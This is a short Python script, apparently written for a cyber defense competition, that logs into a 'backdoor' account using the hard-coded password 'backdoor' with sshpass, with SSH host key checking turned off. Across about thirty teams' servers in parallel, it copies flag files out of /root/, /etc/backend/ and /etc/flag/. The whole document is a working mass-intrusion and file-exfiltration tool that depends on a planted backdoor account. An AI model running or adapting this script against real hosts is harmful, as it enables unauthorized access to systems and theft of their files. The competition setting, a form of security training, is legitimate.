#!/usr/bin/python3
import os
from multiprocessing import Pool

local_directory = "/home/user/Documents/cdc2024/flag_backdoor"
server_names = ["mqtt", "backend", "cam"]
flag_locations = ["/root/", "/etc/backend/", "/etc/flag/"]

def retrieve_flags(team_number):
    for server_num in range(len(server_names)):
        server_url = f"{server_names[server_num]}.team{team_number}.isucdc.com"
        command = f'sshpass -p backdoor scp -o StrictHostKeyChecking=no -r backdoor@{server_url}:{flag_locations[server_num]} {local_directory}/{server_url}_flag.txt'
        print(command)
        os.system(command)

if __name__ == "__main__":
    # Define the number of processes
    num_processes = 30

    # Create a Pool of processes
    with Pool(num_processes) as pool:
        # Map the process function to the team numbers
        pool.map(retrieve_flags, range(2, 33))
        #pool.map(process, range(40, 41))
